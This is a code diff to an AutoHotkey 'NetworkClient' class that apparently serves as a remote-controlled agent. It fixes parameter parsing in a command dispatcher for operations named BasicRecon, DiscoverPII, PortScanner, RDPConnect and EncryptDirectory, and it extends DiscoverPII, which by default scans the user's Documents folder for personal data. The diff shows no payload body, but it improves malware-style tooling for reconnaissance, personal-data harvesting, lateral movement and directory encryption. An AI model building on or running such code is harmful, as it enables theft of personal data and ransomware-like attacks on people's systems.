@@ -708,8 +708,8 @@ class NetworkClient {
                 case "BasicRecon":
                     this.BasicRecon()
                 case "DiscoverPII":
-                    parametersParts := StrSplit(parameters, ",") ; TODO: Fix second parameter not appearing 
-                    this.DiscoverPII(parametersParts[1])
+                    parametersParts := StrSplit(parameters, ",")
+                    this.DiscoverPII(parametersParts[1], parametersParts[2])
                 case "PortScanner":
                     parametersParts := StrSplit(parameters, "%2C")
                     this.PortScanner(parametersParts[1], parametersParts[2])
@@ -765,7 +765,7 @@ class NetworkClient {
                     }
                 case "RDPConnect":
                     parametersParts := StrSplit(parameters, ",", " ")
-                    this.RDPConnect(parametersParts[1], parametersParts[2], parametersParts[3], parametersParts[4])
+                    this.RDPConnect(parametersParts[1], parametersParts[2], parametersParts[3], parametersParts[4], parametersParts[5])
                 case "EncryptDirectory":
                     parametersParts := StrSplit(parameters, ",", " ")
                     this.EncryptDirectory(parametersParts[1], parametersParts[2])
@@ -867,10 +867,11 @@ class NetworkClient {
         return true
     }
 
-    DiscoverPII(documentsPath := "") {
+    DiscoverPII(documentsPath := "", contextLength := 30) {
         if (documentsPath = "")
             documentsPath := A_MyDocuments
-        contextLength := 30
+        if (contextLength = "")
+            contextLength := 30
         this.log("Starting document scan in: " documentsPath)
         results := []
         
